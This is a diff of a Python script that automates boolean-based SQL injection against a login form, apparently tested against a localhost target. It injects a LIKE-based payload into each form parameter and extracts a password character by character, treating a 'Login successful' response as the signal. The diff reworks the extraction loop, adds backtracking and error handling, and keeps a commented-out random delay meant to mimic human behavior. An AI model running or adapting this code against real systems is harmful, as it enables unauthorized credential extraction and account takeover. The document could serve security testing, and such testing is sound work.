@@ -3,84 +3,13 @@ import time
 import random
 import logger
 
-def non_blind(form):
+class TestPayloadException(Exception):
+    pass
 
-    load = ""
-
-# Define the login URL and parameters
-# username = "admin"  # Assuming 'admin' is the username
-# password_param = "password"  # Assuming 'password' is the parameter to inject
-
-# Initialize an empty password string
-
-    # form = {
-    #     'url': 'http://localhost:8080/login',
-    #     'body': [
-    #                 {'name': 'userName', 'value': 'admin'},
-    #                 {'name': 'password', 'value': payload}
-    #     ]
-    # }
-    num_of_params = len(form['body'])
-    params_tries = [False] * num_of_params
-    tries = 0
-    
-    while tries < num_of_params:
-    
-        index = random.randint(0, num_of_params - 1)
-        
-        if params_tries[index]:
-            continue
-            
-        params_tries[index] = True
-        
-        param_name = form['body'][index]['name']
-        
-        print("Trying to find password for parameter:", param_name)
-        
-    # List of characters to try for the password
-        characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-        max_password_length = 20  # Set a reasonable limit for the password length
-        max_runtime = 600  # Maximum total runtime in seconds (10 minutes)
-
-        start_time = time.time()
-
-    # Loop to find each character of the password
-        while len(load) < max_password_length:
-            found_char = False
-            for char in characters:
-                if test_payload(form, param_name, load, char):
-                    load += char
-                    print("Found character:", char)
-                    print("Current password:", load)
-                    found_char = True
-                    break
-            
-            # If no character was found or maximum runtime exceeded, break out of the loop
-            if not found_char or (time.time() - start_time) > max_runtime:
-                print("No more characters found or maximum runtime exceeded. Ending search.")
-                break
-
-        # Print the final password once found
-        print("Final keyload:", load)
-        tries += 1
-
-
-
-
-# Function to test the payload
 def test_payload(form, param, load, char):
     # Construct the payload for SQL injection
-    payload = f"' OR {param} LIKE '{load + char}%' -- "  # Adding SQL comment to ignore rest of the query
+    payload = f"' OR {param} LIKE '{load + char}%' -- "  # Modify payload structure as needed
     headers = {'Content-Type': 'application/json'}
-
-    # Construct the data dictionary for the POST request
-    # form = {
-    #     'url': 'http://localhost:8080/login',
-    #     'body': [
-    #                 {'name': 'userName', 'value': 'admin'},
-    #                 {'name': 'password', 'value': payload}
-    #     ]
-    # }
     
     payloads = {
         "basic": "a123",
@@ -94,19 +23,16 @@ def test_payload(form, param, load, char):
     
     url = form['url']
     
-    
     new_object = {}
 
     for obj in form['body']:
-        
+        value = payloads.get(obj['name'], 'a12345678')
         if obj['name'] == param:
-            obj['value'] = payload
-        elif obj['name'] in payloads:
-            obj['value'] = payloads[obj['name']]
-        else:
-            obj['value'] = 'a12345678'
-        # הכנס את הערך של name כמפתח באובייקט החדש עם הערך של value
-        new_object[obj['name']] = obj['value']
+            value = payload
+        new_object[obj['name']] = value
+
+    # Introduce random delay to simulate human behavior
+    # time.sleep(random.uniform(0.5, 1.5))
 
     # Send the POST request with a timeout
     try:
@@ -114,14 +40,73 @@ def test_payload(form, param, load, char):
         response.raise_for_status()  # Raise an exception for 4xx/5xx errors
     except requests.exceptions.RequestException as e:
         print(f"Request failed: {e}")
+        if hasattr(response, 'status_code') and response.status_code == 500:
+            raise TestPayloadException("Server returned status code 500")
         return False
     
     # Print the payload and response text for debugging
-    # print("Trying payload:", payload)
     if response.status_code == 200:
-    # print("Response status code:", response.status_code)
         print("Response text:", response.text)
         logger.log_response(response.text)
     
     # Check if the login was successful based on response text
     return "Login successful" in response.text
+
+def non_blind(form):
+    max_password_length = 20  # Set a reasonable limit for the password length
+    max_runtime = 60  # Maximum total runtime in seconds (10 minutes)
+    max_attempts_per_char = 50  # Maximum number of attempts per character position
+    
+    num_of_params = len(form['body'])
+    
+    for i in range(num_of_params):
+        param_name = form['body'][i]['name']
+        print(f"Trying to find password for parameter: {param_name}")
+        
+        if form['body'][i]['value'] != '':
+            print(f"Skipping parameter {param_name} since it already has a value.")
+            continue
+        
+        load = ""  # Initialize load for each parameter
+        attempts = 0
+
+        start_time = time.time()
+
+        try:
+            while len(load) < max_password_length and (time.time() - start_time) < max_runtime:
+                char_found = False
+
+                # Sequentially test characters with some randomness
+                for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
+                    if test_payload(form, param_name, load, char):
+                        load += char
+                        print(f"Found character: {char} | Current password: {load}")
+                        char_found = True
+                        break
+                
+                if not char_found:
+                    attempts += 1
+                    if attempts >= max_attempts_per_char:
+                        raise TestPayloadException(f"Max attempts reached for parameter {param_name}. Resetting load.")
+                    
+                    # Erase the last character and continue
+                    if len(load) > 0:
+                        load = load[:-1]
+                        print(f"No valid characters found for {param_name}. Erasing last character. Current load: {load}")
+                    else:
+                        print(f"No valid characters found for {param_name} after {attempts} attempts.")
+                        break
+
+            # After finishing the loop, check if we've found the full password
+            if len(load) >= max_password_length:
+                print(f"Final keyload for parameter {param_name}: {load}")
+            else:
+                print(f"Failed to find full password for parameter {param_name} within time limit.")
+
+        except TestPayloadException as e:
+            print(f"Error for parameter {param_name}: {e}")
+            continue
+        
+        if (time.time() - start_time) >= max_runtime:
+            print(f"Maximum runtime exceeded for parameter: {param_name}")
+            break
